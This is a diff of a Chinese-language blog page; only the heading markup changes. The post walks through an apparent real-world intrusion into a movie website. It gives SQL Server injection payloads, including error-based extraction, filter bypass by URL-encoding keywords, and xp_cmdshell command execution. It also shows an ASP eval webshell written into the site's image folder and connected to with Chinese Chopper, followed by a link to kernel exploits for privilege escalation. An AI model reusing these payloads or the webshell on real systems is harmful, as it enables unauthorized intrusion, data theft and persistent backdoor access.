@@ -184,7 +184,7 @@ classes that you can use:
   </header>
 
   <section id="post-content" class="article-content post">
-    <h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><p>使用<a href="https://whatweb.net/" target="_blank" rel="external">WhatWeb</a>来获取网站的一些基本信息<br><img src="0.png" alt=""></p>
+    <h3><span id="0x00">0x00</span></h3><p>使用<a href="https://whatweb.net/" target="_blank" rel="external">WhatWeb</a>来获取网站的一些基本信息<br><img src="0.png" alt=""></p>
 <p>对资源列表页面随手进行测试发现存在注入漏洞。</p>
 <p>一般网站可能会对用户输入进行过滤，但是对于自己预置的参数值就会放松警惕，此处的<code>area</code>为影片的国家。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">list?area=%E9%A6%99%E6%B8%AF&amp;Category=</div></pre></td></tr></table></figure></p>
 <p><img src="1.png" alt=""></p>
@@ -193,7 +193,7 @@ classes that you can use:
 <p>尝试<code>order</code>出错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">list?area=1&apos; order by 1;--</div></pre></td></tr></table></figure></p>
 <p><strong>注：<code>--</code>后要接一个空格，或者直接使用<code>#</code>注释符，此处为sqlserver,不能使用<code>#</code></strong></p>
 <p><img src="3.png" alt=""></p>
-<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>既然能显示错误，那么考虑使用类型转换报错来返回结果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">list?area=1&apos; and db_name(x)&gt;0;--</div></pre></td></tr></table></figure></p>
+<h3><span id="0x01">0x01</span></h3><p>既然能显示错误，那么考虑使用类型转换报错来返回结果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">list?area=1&apos; and db_name(x)&gt;0;--</div></pre></td></tr></table></figure></p>
 <p><strong><a href="https://technet.microsoft.com/en-us/library/ms189753(v=sql.110).aspx" target="_blank" rel="external">注：<code>x</code>参数可用来选择不同数据库，为空即返回当前数据库名。</a></strong></p>
 <p><img src="4.png" alt=""></p>
 <p>直接猜存在<code>admin</code>表，猜到字段<code>user</code>和<code>pwd</code></p>
@@ -201,7 +201,7 @@ classes that you can use:
 <p>多次测试后发现可通过URL编码转换绕过。如：<code>select</code>改变一个<code>e</code>为 URL编码<code>%65</code>，使用<code>s%65lect</code>即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">list?area=1&apos; and (s%65lect pwd from admin)&gt;0 --</div></pre></td></tr></table></figure></p>
 <p><img src="5.png" alt=""></p>
 <p>结果不可解。</p>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>换思路</p>
+<h3><span id="0x02">0x02</span></h3><p>换思路</p>
 <p>考虑命令执行</p>
 <p>直接添加用户，提权，然后远程连接，发现没有成功。</p>
 <p>但是，执行命令又不能直接在页面回显。</p>
@@ -210,13 +210,13 @@ classes that you can use:
 <p>执行命令，并把结果写入到表中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">list?area=1&apos;;</div><div class="line">IN%53ERT INTO fileList </div><div class="line">  %45XEC xp_cmdshell &apos;whoami&apos;-- #</div></pre></td></tr></table></figure></p>
 <p>直接读取只能读一行，使用<code>FOR XML</code>，可一次性获取全部内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">list?area=1&apos; and (S%65LECT * FROM fileList FOR XML AUTO)&gt;0 --</div></pre></td></tr></table></figure></p>
 <p>发现权限不够。</p>
-<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>不能一步到位，就退而求其次，上个一句话</p>
+<h3><span id="0x04">0x04</span></h3><p>不能一步到位，就退而求其次，上个一句话</p>
 <p>一开始想着写在<code>list</code>页面的同一个目录下</p>
 <p>无奈发现，写入后，怎么都找不到。</p>
 <p>经指点知，可能采用的是<code>SVM</code>结构的网站，最有效的写入路径应该是存储图片的文件夹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">list?area=1&apos;;</div><div class="line">IN%53ERT INTO fileList   </div><div class="line">  %45XEC xp_cmdshell &apos;echo &lt;%eval request(&quot;pass&quot;)%^&gt;^ &gt; c:\website\Movie\movie\Content\123.asp&apos;--</div></pre></td></tr></table></figure></p>
 <p><strong>注：在cmd中使用<code>&gt;</code>会被解析为输出符号，要想使用必须要用<code>^</code>包裹</strong></p>
 <p>菜刀连接</p>
-<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="external">提权</a></p>
+<h3><span id="0x05">0x05</span></h3><p><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="external">提权</a></p>
 
   </section>
 
